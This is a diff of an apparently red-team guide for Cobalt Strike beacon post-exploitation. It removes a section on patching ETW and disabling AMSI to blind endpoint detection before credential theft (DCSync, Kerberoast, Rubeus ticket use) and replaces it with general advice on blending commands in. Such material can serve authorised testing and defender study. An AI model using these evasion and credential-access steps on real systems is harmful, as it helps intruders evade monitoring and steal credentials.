@@ -556,33 +556,8 @@ Cannot disable kernel callbacks without kernel code execution. **Find an alterna
 | `pth` (Mimikatz CLI) | `Rubeus.exe createnetonly` + `ptt` for token impersonation |
 | Direct LSASS dump CLI tools | `krb_dump` (Kerbeus-BOF) — Kerberos API, no raw LSASS read; use `dcsync` from DA beacon for NTLM hashes |
 
----
-
-## ETW + AMSI Bypass — Run Together Before Heavy Post-Ex
-
-Patch both before any `execute-assembly`, `powerpick`, or credential access work.
-
-```cs
-// Step 1 — Patch ETW in current beacon process (cuts EDR telemetry feed)
-beacon> inline-execute etw_patch.o          // OPSEC-SAFE — BOF, runs in beacon thread
-
-// Step 2 — AMSI handled automatically by post-ex block in Malleable C2 profile:
-// post-ex { set amsi_disable "true"; }
-// This disables AMSI in every fork & run sacrificial process (execute-assembly, powerpick)
-
-// Step 3 — Confirm before running tools
-beacon> powerpick $ExecutionContext.SessionState.LanguageMode
-// FullLanguage = AMSI not blocking → safe to run assemblies
-```
-
-**When to run:**
-```
-After first beacon checks in → before any post-ex tool execution
-After lateral move to new host → repeat ETW patch on new beacon
-Before DCSync, Kerberoast, BloodHound collection
-```
-
-> ETW patch is per-process — does not persist across beacon migrations or new processes.
+You cannot just rely on settings in your C2 profile for post-ex defence evasion.  
+Every command you run must blend in based on where your current Beacon is running and what command you want to run.  
 
 ---
 
@@ -612,9 +587,6 @@ Before DCSync, Kerberoast, BloodHound collection
 5. Per-command before execution:
    beacon> ppid <appropriate parent PID>
    beacon> spawnto x64 <contextually appropriate process>
-
-6. Patch ETW before heavy post-ex:
-   beacon> inline-execute etw_patch.o
 ```
 
 ---
